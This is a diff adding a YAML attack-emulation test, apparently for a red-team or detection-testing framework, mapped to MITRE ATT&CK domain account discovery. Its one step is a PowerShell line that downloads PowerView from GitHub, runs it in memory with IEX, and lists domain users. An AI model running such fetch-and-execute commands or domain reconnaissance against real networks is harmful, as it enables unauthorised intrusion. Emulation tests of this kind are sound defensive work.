@@ -1,0 +1,24 @@
+api_version: "2.0"
+name: Get-DomainUser with PowerView
+description: |
+    Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.
+uuid: 93662494-5ed7-4454-a04c-8c8372808ac2
+mitre:
+    tactics:
+        - 'TA0007: Discovery'
+    techniques:
+        - 'T1087: Account Discovery'
+    subtechniques:
+        - 'T1087.002: Domain Account'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: get-domainuser-with-powerview
+      inline: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
